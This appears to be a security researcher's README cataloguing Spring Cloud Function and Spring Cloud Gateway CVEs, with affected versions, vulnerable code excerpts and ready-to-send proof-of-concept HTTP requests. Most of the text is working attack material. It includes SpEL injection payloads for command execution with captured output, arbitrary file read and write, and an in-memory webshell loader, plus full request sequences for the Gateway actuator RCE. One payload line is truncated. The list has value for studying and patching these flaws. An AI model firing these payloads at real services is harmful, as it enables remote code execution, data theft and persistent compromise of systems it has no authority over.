# SpringSecurity
A list for Spring Security

## Spring Cloud Function
### CVE-2022-22979 DoS
Affected Version: < 3.2.6  
Ref: https://checkmarx.com/blog/spring-function-cloud-dos-cve-2022-22979-and-unintended-function-invocation/  
POC: 
```
POST /uppercase, HTTP/1.1

{'a':1}
```
Factor: 
```
BeanFactoryAwareFunctionRegistry
public <T> T lookup(Class<?> type, String functionDefinition, String... expectedOutputMimeTypes) {
    functionDefinition = StringUtils.hasText(functionDefinition) ? functionDefinition : this.applicationContext.getEnvironment().getProperty("spring.cloud.function.definition", ""); // get uri -> "uppercase,"
    functionDefinition = this.normalizeFunctionDefinition(functionDefinition); // Replace , with |, -> "uppercase|"
    ...
    FunctionInvocationWrapper function = (FunctionInvocationWrapper)this.doLookup(type, functionDefinition, expectedOutputMimeTypes);// (1)function=wrappedFunctionDefinitions.get(functionDefinition); (2)if(function==null){"uppercase|" -> ["uppercase", ""]，遍历数组从Function注册表中寻找对应值，找到了就将Function存放于wrappedFunctionDefinitions，没找到就返回空}
    if (function == null) {
      ...
      this.register(functionRegistration);// SimpleFunctionRegistry.register
    }
}

SimpleFunctionRegistry
public <T> void register(FunctionRegistration<T> registration) {
    this.functionRegistrations.add(registration); //将funtion注册在funtionRegistrations中，它是CopyOnWriteArraySet类型，随着size无限增大造成DoS
}
```
### CVE-2022-22963 SpEL
Affected Version: <= 3.1.6, 3.2.2   
POC: 
```
POST /functionRouter HTTP/1.1
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("open -a Calculator")

aaa
```
Factor: 
```
RoutingFunction
private Object route(Object input, boolean originalInputIsPublisher) {
    Function function;
    if (input instanceof Message) {
        if (StringUtils.hasText((String)message.getHeaders().get("spring.cloud.function.definition"))) {...}
        else if (StringUtils.hasText((String)message.getHeaders().get("spring.cloud.function.routing-expression"))) {
            function = this.functionFromExpression((String)message.getHeaders().get("spring.cloud.function.routing-expression"), message);
            ...
        }...
}

private final StandardEvaluationContext evalContext = new StandardEvaluationContext();

private Function functionFromExpression(String routingExpression, Object input) {
    Expression expression = this.spelParser.parseExpression(routingExpression);
    String functionName = (String)expression.getValue(this.evalContext, input, String.class);
    ...
}
```
SpEL POC:  
```
// Command Execution
T(Runtime).getRuntime().exec(\"open -a Calculator\")
new java.lang.ProcessBuilder({\"/bin/sh\",\"-c\",\"open -a Calculator\"}).start()
T(String).getClass().forName("java.lang.Runtime").getRuntime().exec("open -a Calculator")
T(String).getClass().forName("java.lang.Runtime").getMethod("exec",T(String[])).invoke(T(String).getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(T(String).getClass().forName("java.lang.Runtime")),new String[]{"/bin/sh","-c","open -a Calculator"})
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='/bin/sh';s[1]='-c';s[2]='open -a Calculator';java.lang.Runtime.getRuntime().exec(s);")
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("s=[3];s[0]='/bin/sh';s[1]='-c';s[2]='open -a Calculator';java.lang.Runtime.getRuntime().exec(s);"),)
nstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a...")),)

// Command Execution + Response
new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("/bin/sh", "-c", "whoami").start().getInputStream(), "gbk")).readLine()
new java.util.Scanner(new java.lang.ProcessBuilder("/bin/sh", "-c", "ls", ".\\").start().getInputStream(), "GBK").useDelimiter("asdfasdf").next()

// Read or Write File
new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get(T(java.net.URI).create("file:/Users/axisx/Downloads/application.properties"))))
T(java.nio.file.Files).write(T(java.nio.file.Paths).get(T(java.net.URI).create("file:/C:/Users/1.txt")), 'hello'.getBytes(), T(java.nio.file.StandardOpenOption).WRITE)

// MemShell
#{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}
```

## Spring Cloud Gateway
### CVE-2022-22947 RCE
Affected Version: < 3.1.1 or < 3.0.7  
Ref: https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/  
https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/  
Diff: https://github.com/spring-cloud/spring-cloud-gateway/commit/337cef276bfd8c59fb421bfe7377a9e19c68fe1e  
POC1(Command Execution): 
```
POST /actuator/gateway/routes/new_route HTTP/1.1
Host: 127.0.0.1:9000
Connection: close
Content-Type: application/json

{
  "predicates": [
    {
      "name": "Path",
      "args": {
        "_genkey_0": "/new_route/**"
      }
    }
  ],
  "filters": [
    {
      "name": "RewritePath",
      "args": {
        "_genkey_0": "#{T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")}",
        "_genkey_1": "/${path}"
      }
    }
  ],
  "uri": "https://wya.pl",
  "order": 0
}
```
```
POST /actuator/gateway/refresh HTTP/1.1
Host: 127.0.0.1:9000
Content-Type: application/json
Connection: close
Content-Length: 258
```
POC2(Command Execution + Response):
```
POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 329

{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}
```
```
POST /actuator/gateway/refresh HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
```
GET /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
Factor: 
```
ShortcutConfigurable
static Object getValue(SpelExpressionParser parser, BeanFactory beanFactory, String entryValue) {
    String rawValue = entryValue;
    if (entryValue != null) {
        rawValue = entryValue.trim();
    }

    Object value;
    if (rawValue != null && rawValue.startsWith("#{") && entryValue.endsWith("}")) {
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setBeanResolver(new BeanFactoryResolver(beanFactory));
        Expression expression = parser.parseExpression(entryValue, new TemplateParserContext());
        value = expression.getValue(context);
    } else {
        value = entryValue;
    }

    return value;
}
```
